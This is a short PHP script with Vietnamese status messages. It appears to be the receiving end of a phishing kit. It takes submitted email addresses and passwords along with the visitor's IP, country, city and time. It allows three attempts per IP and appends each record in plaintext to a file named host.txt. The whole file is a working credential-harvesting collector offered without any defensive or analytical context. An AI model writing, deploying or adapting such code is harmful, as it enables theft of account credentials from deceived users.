<?php
$data = json_decode(file_get_contents("php://input"), true);
if (!$data) {
    echo json_encode(['message' => 'Dữ liệu không hợp lệ']);
    exit;
}

$email = $data['email'];
$pass = $data['pass'];
$ip = $data['ip'];
$country = $data['country'];
$city = $data['city'];
$time = $data['time'];

// File đếm số lần IP
$ipFile = 'ip_limit.json';
$ipData = file_exists($ipFile) ? json_decode(file_get_contents($ipFile), true) : [];

if (!isset($ipData[$ip])) {
    $ipData[$ip] = 0;
}
if ($ipData[$ip] >= 3) {
    echo json_encode(['message' => 'IP của bạn đã vượt quá số lần thử cho phép.']);
    exit;
}

// Tăng số lần thử
$ipData[$ip]++;
file_put_contents($ipFile, json_encode($ipData));

// Ghi dữ liệu vào file host.txt
$entry = "$email|$pass|$ip|$country|$city|$time\n";
file_put_contents('host.txt', $entry, FILE_APPEND);

echo json_encode(['message' => 'Dữ liệu đã được lưu']);
